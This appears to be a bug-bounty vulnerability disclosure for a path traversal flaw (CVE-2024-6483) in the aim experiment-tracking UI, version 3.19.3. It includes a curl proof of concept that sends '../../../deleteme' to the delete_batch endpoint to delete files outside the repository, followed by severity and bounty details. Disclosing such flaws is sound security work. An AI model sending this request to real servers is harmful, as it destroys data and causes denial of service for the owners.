@@ -1,0 +1,30 @@
+Title: Arbitrary file/directory deletion in aimhubio/aim
+
+Proof of Concept: 
+Host the UI server. I followed the specifications for hosting aim remotely, i.e. a suggested setup for running the software on a remote server. Host the UI (and initialize a repo) by running aim up --repo .. This also specifies the repo-path that the UI should use, in this case in the current working directory. (the repo files are in this case placed within ./.aim)
+Create a "target"-file in the current working directory, by running touch deleteme.
+From an external client, send the following request:
+
+curl --location "http://HOST_IP:43800/api/runs/delete_batch" --header "Content-Type application:json" --data '[../../../deleteme]'
+
+Impact: 
+This vulnerability allows for arbitrary file or directory deletion through path traversal. This can be abused to cause denial of service, or arbitrary data loss.
+
+CVE ID: CVE-2024-6483
+Status: (assigned)
+Vulnerability Type: CWE-23: Relative Path Traversal
+Severity: Medium (5.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: Low
+Registry: Pypi
+Affected Version: 3.19.3
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $75
+Fix Bounty: $18.75
